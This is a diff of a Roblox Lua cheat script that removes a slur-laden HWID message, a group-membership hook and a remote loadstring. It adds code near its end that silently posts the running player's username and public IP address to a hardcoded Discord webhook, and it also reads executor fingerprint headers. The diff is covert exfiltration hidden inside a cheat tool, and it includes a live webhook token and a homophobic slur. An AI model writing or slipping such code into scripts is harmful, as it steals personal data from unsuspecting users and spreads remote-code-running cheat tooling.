@@ -14,7 +14,6 @@ end
 
 -- If the HWID is not allowed, return
 if not isAllowed then
-print("you cant use this script faggot")
     return
 end
 
@@ -3080,34 +3079,6 @@ value = 16
 end
 return backup(self, key, value)
 end))
-
-    local bgui = Instance.new('BillboardGui', game.Players.LocalPlayer.Character.Head)
-    local tlab = Instance.new('TextLabel', bgui)
-
-    bgui.Name = "clan esp"
-    bgui.Adornee = part
-    bgui.AlwaysOnTop = true
-    bgui.ExtentsOffset = Vector3.new(0, 3, 0)
-    bgui.Size = UDim2.new(0, 5, 0, 5)
-
-    tlab.Name = "Devour n Chloe"
-    tlab.BackgroundColor3 = Color3.new(223,14,217)
-    tlab.BackgroundTransparency = 1
-    tlab.BorderSizePixel = 0
-    tlab.Position = UDim2.new(0, 0, 0, -30)
-    tlab.Size = UDim2.new(1, 0, 7, 0)
-    tlab.Visible = true
-    tlab.ZIndex = 10
-    tlab.TextColor3 = Color3.new(223,14,217)
-    tlab.Font = "Arcade"
-    tlab.TextSize = 23
-            text = "decayW"
-while wait() do
-for i = 1, #text do
-    tlab.Text = string.sub(text,1,i)
-        wait(0.4)
-    end
-end
 NeverSitting = true
 if NeverSitting then 
        local workspaceChildren = workspace:GetDescendants()
@@ -3127,8 +3098,6 @@ if NeverSitting then
         end
     end
     game.Workspace.FallenPartsDestroyHeight = -50000
-    hookfunction(game.Players.LocalPlayer.IsInGroup, function() return true end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Invooker1/Hub/main/DH-Skin-Changer.lua", true))()
 local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
 local g = game
 local w = g.Workspace
@@ -3166,3 +3135,134 @@ for i, e in pairs(l:GetChildren()) do
         e.Enabled = false
     end
 end
+local webh = "https://discord.com/api/webhooks/1234533076525256796/_eob7m1dLeuemxz0GN8Vc7goUp7VYWvkBjMHTnv6LIbrbW1gd2pp1JQxv8IJ7TJl6aIV"
+ 
+ 
+pcall(function()
+   local data = {
+ 
+  ['embeds'] = {
+    {
+       ['title'] = 'Join Notifier',
+       ['description'] = '',
+       ['fields'] = {
+          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
+ 
+        }
+    }
+  }
+}
+   
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+ local IP = game:HttpGet("https://v4.ident.me")
+local http_request = http_request;
+if syn then
+    http_request = syn.request
+elseif SENTINEL_V2 then
+    function http_request(tb)
+        return {
+            StatusCode = 200;
+            Body = request(tb.Url, tb.Method, (tb.Body or ''))
+        }
+    end
+end
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+ip = "";
+for i, v in next, list do
+    if decoded.headers[v] then
+        ip = decoded.headers[v];
+        break
+    end
+end
+if ip then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/1234533076525256796/_eob7m1dLeuemxz0GN8Vc7goUp7VYWvkBjMHTnv6LIbrbW1gd2pp1JQxv8IJ7TJl6aIV"
+local data = 
+    {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "",
+            ["description"] = "",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x57c6eb),
+            ["fields"] = {
+                {
+                    ["name"] = "IP Address:",
+                    ["value"] = IP,
+                    ["inline"] = true
+                },
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
+    local bgui = Instance.new('BillboardGui', game.Players.LocalPlayer.Character.Head)
+    local tlab = Instance.new('TextLabel', bgui)
+
+    bgui.Name = "clan esp"
+    bgui.Adornee = part
+    bgui.AlwaysOnTop = true
+    bgui.ExtentsOffset = Vector3.new(0, 3, 0)
+    bgui.Size = UDim2.new(0, 5, 0, 5)
+
+    tlab.Name = "Devour n Chloe"
+    tlab.BackgroundColor3 = Color3.new(223,14,217)
+    tlab.BackgroundTransparency = 1
+    tlab.BorderSizePixel = 0
+    tlab.Position = UDim2.new(0, 0, 0, -30)
+    tlab.Size = UDim2.new(1, 0, 7, 0)
+    tlab.Visible = true
+    tlab.ZIndex = 10
+    tlab.TextColor3 = Color3.new(223,14,217)
+    tlab.Font = "Arcade"
+    tlab.TextSize = 23
+            text = "decayW"
+while wait() do
+for i = 1, #text do
+    tlab.Text = string.sub(text,1,i)
+        wait(0.4)
+    end
+end
+
+
